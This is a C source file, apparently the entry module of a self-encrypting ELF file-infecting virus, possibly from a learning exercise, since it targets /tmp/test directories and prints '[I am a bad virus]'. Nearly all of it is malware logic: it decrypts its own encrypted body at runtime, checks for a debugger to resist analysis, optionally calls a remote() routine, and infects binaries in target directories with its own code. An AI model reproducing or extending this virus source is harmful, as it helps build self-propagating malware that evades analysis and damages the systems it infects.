#include <elf.h>
#include "lib/infect.h"
#include "lib/lib.h"
#include "lib/remote.h"
#include "lib/infect.h"
#include "virus_pos.h"
#include "virus_table.h"

int __attribute__((section (".textearly"))) main(int ac, char **av) asm ("entry");
int __attribute__((section (".textearly"))) decrypt();

extern struct s_opt opt;

extern char test_area;
extern char   key[16];

extern Garbage garbage_table[];

//======================= WOODY ==============================

extern void decrypt_block_asm(uint32_t *v, uint32_t *k);

int decrypt(){
        char *s = ((char*)&crypt_start);
        uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
        for (uint64_t i = 0; i < n; i += 8){
                if (i + 8 < n){
                        decrypt_block_asm((uint32_t*)(s+i), (uint32_t*)key);
                }
        }
	//decrypt test area
	n = 15;
	 for (uint64_t i = 0; i < n; i += 8){
                if (i + 8 < n){
                        decrypt_block_asm((uint32_t*)((char *)(&test_area) + i), (uint32_t*)key);
                }
        }
	//check test area
	for (int i = 0; i < n; i++)
		if ((&test_area)[i] != 'A')
			return FALSE;
	
	return TRUE;
}

//=============================================================

void do_infection(){
        char *virus = (char *)&bin_start;
        size_t virus_len = ((size_t)&bin_end) - ((size_t)&bin_start);
        size_t crypt_off = ((size_t)&crypt_start) - ((size_t)&bin_start);
        size_t crypt_len = ((size_t)&crypt_end) - ((size_t)&crypt_start);

	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
}

int virus(int ac, char **av){
	if (checkdebug())
	{
		CALL(SYS_write, 1, "DEBUGGING..\n", 12);
	}
	if (opt.do_remote) remote();
 	if (opt.print_msg) println("[I am a bad virus]");

	do_infection();
	return TRUE;
}

int main(int ac, char **av){
	return checkdebug() == 0 && decrypt() && virus(ac, av);
}
